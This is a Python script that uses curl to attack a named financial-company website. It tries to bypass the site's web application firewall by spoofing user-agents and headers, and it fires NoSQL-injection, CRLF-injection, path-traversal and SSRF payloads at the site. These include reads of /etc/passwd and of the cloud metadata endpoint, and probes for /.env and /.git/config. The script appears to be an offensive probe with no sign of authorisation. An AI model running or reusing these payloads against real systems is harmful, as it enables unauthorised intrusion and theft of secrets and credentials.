import subprocess, time
B = "https://www.infinitycapital.bh"
DOM = "dau2p4ghgqag02k5emggc5yu6hph3m973.oast.abhedi.co.in"  # placeholder, replaced below
DOM = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
UAS = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
 "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
 "curl/8.21.0",
 "python-requests/2.31.0",
 "Googlebot/2.1 (+http://www.google.com/bot.html)",
 "",
]

def go(name, args, timeout=15):
    try:
        r = subprocess.run(["curl", "-sk", "-m", str(timeout), "-o", "/tmp/o.bin",
                            "-w", "%{http_code} sz=%{size_download} mit=%header{x-vercel-mitigated}",
                            *args], capture_output=True, text=True, timeout=timeout + 6)
        print("%-52s %s" % (name, r.stdout), flush=True)
    except Exception as e:
        print("%-52s EXC %s" % (name, e), flush=True)

print("=== UA / header variation to bypass edge WAF ===")
for i, ua in enumerate(UAS):
    go("UA[%d] %s" % (i, (ua or "<empty>")[:30]),
       (["-A", ua] if ua else []) + [B + "/"])
go("X-Forwarded-For 1.1.1.1", ["-H", "X-Forwarded-For: 1.1.1.1", B + "/"])
go("X-Real-Ip 8.8.8.8", ["-H", "X-Real-IP: 8.8.8.8", B + "/"])
go("Range hdr", ["-H", "Range: bytes=0-", B + "/"])
go("gzip+br accept-encoding", ["-H", "Accept-Encoding: gzip, deflate, br", B + "/"])
go("Host: apex", ["-H", "Host: infinitycapital.bh", B + "/"])

print("=== nosqli / injection payloads on /api/ (mongo operators) ===")
for p in ['?id[$ne]=1', '?id[$gt]=', '?username[$regex]=.*', '?q[$where]=1', '?id=1;js:1', '?id=1|0']:
    go("nosqli /api/" + p, [B + "/api/" + p])
print("=== header injection ===")
go("CRLF X-Test", ["-H", "X-Test: a%0d%0aInjected:%20yes", B + "/"])
print("=== path traversal / lfi ===")
for p in ["/_next/image?url=file:///etc/passwd&w=1&q=1",
          "/_next/image?url=http://169.254.169.254/latest/meta-data/&w=1&q=1",
          "/api/../../../../etc/passwd"]:
    go("lfi " + p[:45], [B + p])
print("=== config/secret paths (does WAF apply uniformly?) ===")
for p in ["/.env", "/.git/config", "/_next/data", "/api/health", "/sitemap.xml", "/.well-known/security.txt"]:
    go("cfg " + p, [B + p])
print("DONE")
